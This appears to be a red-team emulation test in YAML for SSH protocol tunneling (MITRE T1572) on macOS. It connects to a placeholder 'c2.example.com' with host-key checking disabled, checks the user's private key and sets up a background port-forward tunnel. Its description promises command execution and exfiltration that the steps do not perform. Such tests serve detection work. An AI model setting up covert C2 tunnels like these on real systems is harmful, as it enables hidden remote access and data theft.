---
api_version: 2.0
uuid: 31be8134-711d-461f-bda7-16a80be84cdd
name: SSH Tunneling Capability
authors:
- Claude Code
description: |
  Tests SSH tunneling for C2 command execution and data exfiltration
mitre:
  tactics:
  - TA0011 Command and Control
  techniques:
  - T1572 Protocol Tunneling
requirements:
  platforms:
  - os: darwin
args:
- name: ssh_host
  description: SSH server hostname or IP
  type: string
  default: c2.example.com
- name: ssh_port
  description: SSH server port
  type: integer
  default: 22
- name: ssh_user
  description: SSH username
  type: string
  default: testuser
- name: ssh_key_path
  description: Path to SSH private key
  type: string
  default: ~/.ssh/id_rsa
- name: local_port
  description: Local forwarding port
  type: integer
  default: 9999
- name: remote_port
  description: Remote port to forward
  type: integer
  default: 8080
steps:
- name: ssh_connectivity_check
  description: Test SSH connectivity
  inline: |
    timeout 5 ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
      -p {{ .Args.ssh_port }} {{ .Args.ssh_user }}@{{ .Args.ssh_host }} "echo 'SSH connection successful'" 2>/dev/null || echo "SSH connection failed"
- name: ssh_key_validation
  description: Validate SSH key availability
  inline: |
    if [ -f "{{ .Args.ssh_key_path }}" ]; then
      echo "SSH key found at {{ .Args.ssh_key_path }}"
      ssh-keygen -l -f "{{ .Args.ssh_key_path }}" 2>/dev/null || echo "Could not read key"
    else
      echo "SSH key not found"
    fi
- name: ssh_tunnel_setup_test
  description: Establish SSH local port forwarding tunnel
  inline: |
    echo "Establishing SSH tunnel: local {{ .Args.local_port }} -> {{ .Args.ssh_host }}:{{ .Args.remote_port }}"
    timeout 10 ssh -N -f -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes \
      -L {{ .Args.local_port }}:localhost:{{ .Args.remote_port }} \
      -p {{ .Args.ssh_port }} {{ .Args.ssh_user }}@{{ .Args.ssh_host }} \
      -i {{ .Args.ssh_key_path }} 2>&1 || echo "SSH tunnel failed (target may not be reachable)"
    # Verify tunnel is listening
    lsof -i :{{ .Args.local_port }} 2>/dev/null | grep ssh || echo "Tunnel not active on port {{ .Args.local_port }}"
  cleanup:
    inline: |
      pkill -f "ssh.*{{ .Args.ssh_host }}" 2>/dev/null || true
      pkill -f "ssh -N" 2>/dev/null || true
tests:
- name: dry_run_test
  dry_run: true
